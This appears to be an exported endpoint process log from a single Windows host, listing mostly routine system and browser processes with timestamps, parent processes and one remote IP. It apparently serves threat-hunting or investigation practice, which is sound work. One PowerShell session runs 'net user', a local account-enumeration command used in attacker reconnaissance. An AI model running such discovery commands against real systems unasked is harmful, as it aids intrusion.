Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteIP
"Sep 16, 2025 2:51:45 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --embedded-browser-webview=1 --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --js-flags=""--expose-gc --ms-user-locale="" --time-ticks-at-unix-epoch=-1758048084299704 --launch-time-ticks=621189990 --ram-no-pressure-read-main-dll --metrics-shmem-handle=3460,i,4173574439834776941,4635381963538480990,2097152 --field-trial-handle=1912,i,3704950018702456231,6645339648170424040,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,msAggressiveCacheTrimming,msCustomDataPartition,msEmbeddedBrowserVisualHosting,msWebView2NoTabForScreenShare,msWebViewAppLifeCycleWorkaround --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,SafetyHub,SegmentationPlatform,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeCoupons,msAutofillEdgeCouponsAutoApply,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPrintInWebView2,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsTaskManager,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --mojo-platform-channel-handle=3484 /prefetch:1",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
"Sep 16, 2025 2:51:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:59 PM",slflarewinsysmo,slflare,ShellExperienceHost.exe,"""ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:00 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:05 PM",slflarewinsysmo,slflare,rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:06 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:07 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:52:07 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 2:54:36 PM",slflarewinsysmo,slflare,UserOOBEBroker.exe,UserOOBEBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:54:36 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:14 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:16 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:47 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:58:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:58:51 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -evaluateEligibility",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:17 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:19 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:20 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:23 PM",slflarewinsysmo,slflare,sdiagnhost.exe,sdiagnhost.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:59:23 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,sdiagnhost.exe,sdiagnhost.exe -Embedding,159.26.106.84
"Sep 16, 2025 3:01:18 PM",slflarewinsysmo,slflare,DeviceCensus.exe,"""devicecensus.exe"" UserCxt",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:01:40 PM",slflarewinsysmo,slflare,DismHost.exe,dismhost.exe {7358A319-49EE-410B-A0E9-3FD0A67D4FFB},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",159.26.106.84
"Sep 16, 2025 3:02:43 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:04:35 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:05:54 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:06:04 PM",slflarewinsysmo,slflare,net.exe,"""net.exe"" user",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:06:05 PM",slflarewinsysmo,slflare,net1.exe,net1 user,net.exe,"""net.exe"" user",159.26.106.84
"Sep 16, 2025 3:12:33 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:14:36 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:16:43 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:16:44 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:17:01 PM",slflarewinsysmo,slflare,TextInputHost.exe,"""TextInputHost.exe"" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:02 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:02 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:06 PM",slflarewinsysmo,slflare,notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:17:43 PM",slflarewinsysmo,slflare,notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
